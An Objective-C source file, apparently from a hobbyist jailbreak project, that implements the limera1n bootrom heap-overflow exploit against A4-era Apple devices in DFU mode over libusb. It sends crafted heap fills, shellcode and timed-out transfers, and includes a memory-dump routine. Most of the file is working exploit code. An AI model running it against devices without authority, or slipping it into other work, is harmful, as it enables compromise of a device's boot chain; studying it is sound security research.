//
//  main.m
//  jailbreak
//
//  Created by Phillip Tennen on 08/07/2023.
//

#import <Foundation/Foundation.h>
#import <IOKit/usb/IOUSBLib.h>
#import <libusb-1.0/libusb.h>

#define LOADADDR    0x84000000
// A4:
#define EXPLOIT_LR    0x8403BF9C
#define LOADADDR_SIZE    0x2C000
#define FOUR_K_PAGE 0x1000

// DFU_MAX_TRANSFER_SIZE
#define BUF_SIZE 0x800

struct libusb_device_handle* find_device(struct libusb_context* context, int vendor_id, int device_id, char* serial_number_out) {
    NSLog(@"Looking for device...");
    struct libusb_device** device_list = NULL;
    ssize_t device_count = libusb_get_device_list(context, &device_list);
    NSLog(@"Found %d devices in device list %p", device_count, device_list);
    struct libusb_device_handle* handle = NULL;

    for (ssize_t i = 0; i < device_count; i++) {
        struct libusb_device* device = device_list[i];
        struct libusb_device_descriptor device_desc;
        libusb_get_device_descriptor(device, &device_desc);
        //NSLog(@"Found device: [Vendor 0x%04x], [Product 0x%04x]", device_desc.idVendor, device_desc.idProduct);
        
        if (device_desc.idVendor == vendor_id && device_desc.idProduct == device_id) {
            libusb_open(device, &handle);
            char serial[128] = {0};
            libusb_get_string_descriptor_ascii(handle, device_desc.iSerialNumber, &serial, 128);
            //NSLog(@"Found device handle %p, serial %s", handle, serial);
            if (serial_number_out) {
                strcpy(serial_number_out, &serial);
            }
            break;
        }
    }
    libusb_free_device_list(device_list, 1);
    
    return handle;
}

long readfile(char* filename, void* buffer) {
    FILE* f = fopen(filename, "rb");
    if (!f) {
        NSLog(@"File couldn't be opened: %s", filename);
        exit(1);
    }
    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    fseek(f, 0, SEEK_SET);
    fread(buffer, 1, len, f);
    fclose(f);
    return len;
}

uint32_t get_file_len(FILE* f) {
    fseek(f, 0, SEEK_END);
    uint32_t len = (uint32_t)ftell(f);
    fseek(f, 0, SEEK_SET);
    return len;
}

void get_status(struct libusb_device_handle* device_handle) {
    unsigned char status[6];
    int ret = libusb_control_transfer(device_handle, 0xa1, 3, 0, 0, status, 6, 100);
    NSLog(@"get_status ret = %d", ret);
}

void dfu_notify_upload_finished(struct libusb_device_handle* device_handle) {
    // ipwndfu calls this "request_image_validation"
    // Ref: https://archive.conference.hitb.org/hitbsecconf2013kul/materials/D2T1%20-%20Joshua%20'p0sixninja'%20Hill%20-%20SHAttered%20Dreams.pdf
    // "Image validation starts whenever the global “file received” variable has been set."
    // "This can be caused by sending 1 empty “Send Data” packet, and 3 “Get Status” packets followed by a USB reset."
    libusb_control_transfer(device_handle, 0x21, 1, 0, 0, 0, 0, 100);
    for (int i = 0; i < 3; i++) {
        get_status(device_handle);
    }
    NSLog(@"Resetting device to complete upload flow...");
    libusb_reset_device(device_handle);
}

void upload_file(struct libusb_device_handle* device_handle, const char* filename) {
    FILE* file = fopen(filename, "rb");
    if (!file) {
        NSLog(@"File could not be opened! %s", filename);
        exit(1);
    }
    uint32_t file_len = get_file_len(file);
    NSLog(@"File is %d bytes", file_len);
    int chunk_size = 0x800;
    unsigned char* chunk_buf = malloc(chunk_size);
    for (int i = 0; i < file_len; i += chunk_size) {
        int read_bytes = (int)fread(chunk_buf, 1, chunk_size, file);
        NSLog(@"\tUpload %d%% done, sending %d bytes...", (int)(((float)i / (float)file_len) * 100.0), read_bytes);
        int ret = libusb_control_transfer(device_handle, 0x21, 1, 0, 0, chunk_buf, read_bytes, 3000);
        NSLog(@"\t\t%d", ret);
    }
    NSLog(@"Informing the device that the upload is finished...");
    dfu_notify_upload_finished(device_handle);
}

struct libusb_device_handle* usb_wait_device_connection(struct libusb_context* context, struct libusb_device_handle* device_handle) {
    //sleep(2);
    libusb_close(device_handle);
    return find_device(context, 0x05ac, 0x1227, NULL);
}

void reset_counters(struct libusb_device_handle* device_handle) {
    int ret = libusb_control_transfer(device_handle, 0x21, 4, 0, 0, 0, 0, 1000);
    NSLog(@"reset_counters retval (expect 0): %d", ret);
}

struct libusb_device_handle* run_limera1n(struct libusb_context* context, struct libusb_device_handle* device_handle) {
    // Run limera1n
    unsigned char buf[LOADADDR_SIZE] = {0};
    unsigned char shellcode[BUF_SIZE] = {0};
    unsigned int stack_addr = EXPLOIT_LR;
    // PT: Is the +1 to indicate THUMB?
    unsigned int shellcode_addr = LOADADDR + LOADADDR_SIZE - FOUR_K_PAGE + 1;
    NSLog(@"Shellcode addr 0x%x", shellcode_addr);
    
    // Read the shellcode into the buffer
    // TODO: Check the shellcode looks correct?
    NSLog(@"Reading file...");
    long shellcode_length = readfile("/Users/philliptennen/Documents/Jailbreak/jailbreak/payload_stage1/build/payload_stage1_shellcode", shellcode);
    NSLog(@"Shellcode len %lx", shellcode_length);
    
    NSLog(@"Sending heap fill with jump");
    memset(buf, 0xcc, BUF_SIZE);
    for (int i = 0; i < BUF_SIZE; i += 0x40) {
        unsigned int* heap = (unsigned int*)(buf + i);
        heap[0] = 0x405;
        heap[1] = 0x101;
        heap[2] = shellcode_addr;
        heap[3] = stack_addr;
    }
    
    // Send the heap fill
    // (This one includes the jump addr)
    NSLog(@"Sending heap fill");
    int sent_bytes = libusb_control_transfer(device_handle,
                                             0x21,
                                             1,
                                             0,
                                             0,
                                             buf,
                                             BUF_SIZE,
                                             1000);
    
    // Fill the heap even more?!
    NSLog(@"Filling the heap some more");
    memset(buf, 0xcc, BUF_SIZE);
    for (int i = 0; i < (LOADADDR_SIZE - 0x1800); i += BUF_SIZE) {
        sent_bytes = libusb_control_transfer(device_handle, 0x21, 1, 0, 0, buf, BUF_SIZE, 1000);
        //NSLog(@"Sent bytes %X %s\n", sent_bytes, libusb_error_name(sent_bytes));
    }
    
    NSLog(@"Sending shellcode");
    sent_bytes = libusb_control_transfer(device_handle, 0x21, 1, 0, 0, shellcode, BUF_SIZE, 1000);
    NSLog(@"Sent %X bytes of shellcode, length = %lX", sent_bytes, shellcode_length);
    memset(buf, 0xbb, 0x800);
    sent_bytes = libusb_control_transfer(device_handle, 0xa1, 1, 0, 0, buf, 0x800, 1000);
    //NSLog(@"never freed %X", sent_bytes);
    //NSLog(@"Reading back some data");
    //hexdump(buf, 0x800);
    
    NSLog(@"Sending some random data to force a timeout");
    sent_bytes = libusb_control_transfer(device_handle, 0x21, 1, 0, 0, buf, 0x800, 10);
    //NSLog(@"new one %x", sent_bytes);
    
    // This should fail too
    sent_bytes = libusb_control_transfer(device_handle, 0x21, 2, 0, 0, buf, 0, 10);
    NSLog(@"Sent exploit to heap overflow %X %s", sent_bytes, libusb_error_name(sent_bytes));

    libusb_reset_device(device_handle);
    dfu_notify_upload_finished(device_handle);
    //libusb_reset_device(device_handle);
    // communicate with the payload
    struct libusb_device_handle* device_handle2 = usb_wait_device_connection(context, device_handle);
    NSLog(@"Reconnected, limera1n finished");
    
    //dump_state(device_handle2);

    //NSLog(@"all done");
    return device_handle2;
}

void pull_dump(struct libusb_device_handle* device_handle) {
    NSLog(@"Pulling a dump...");
    FILE* fout = fopen("/Users/philliptennen/Documents/Jailbreak/jailbreak/sentinel_dump2.bin", "wb");
    unsigned char data[0x800] = {0};
    for (int addr = 0; addr < 0x1000; addr += 0x800) {
        int ret = libusb_control_transfer(device_handle, 0xa1, 2, 0, 0, data, 0x800, 0);
        //NSLog(@"ret %d", ret);
        fwrite(data, 1, 0x800, fout);
    }
    fclose(fout);
}

void inner_main(void) {
    // Initialize USB connection with the DFU device
    struct libusb_context* context = NULL;
    libusb_init(&context);

    struct libusb_device_handle* device_handle = NULL;
    bool did_already_perform_exploit = false;
    while (1) {
        char serial[128] = {0};
        device_handle = find_device(context, 0x05ac, 0x1227, &serial);
        if (device_handle) {
            did_already_perform_exploit = strcmp(serial, "[Overwritten serial number!]") == 0;
            break;
        }
        NSLog(@"Failed to find DFU device.");
        return;
        sleep(1);
    }

    struct libusb_device_handle* device_handle2 = device_handle;
    
    if (!did_already_perform_exploit) {
        NSLog(@"Device has not been exploited yet...");
        device_handle2 = run_limera1n(context, device_handle2);
    }
    else {
        NSLog(@"Skipped performing exploit because the device is already pwned");
    }

    sleep(1);

    libusb_close(device_handle2);
    libusb_exit(context);
}

int main(int argc, const char* argv[]) {
    @autoreleasepool {
        inner_main();
    }
    return 0;
}
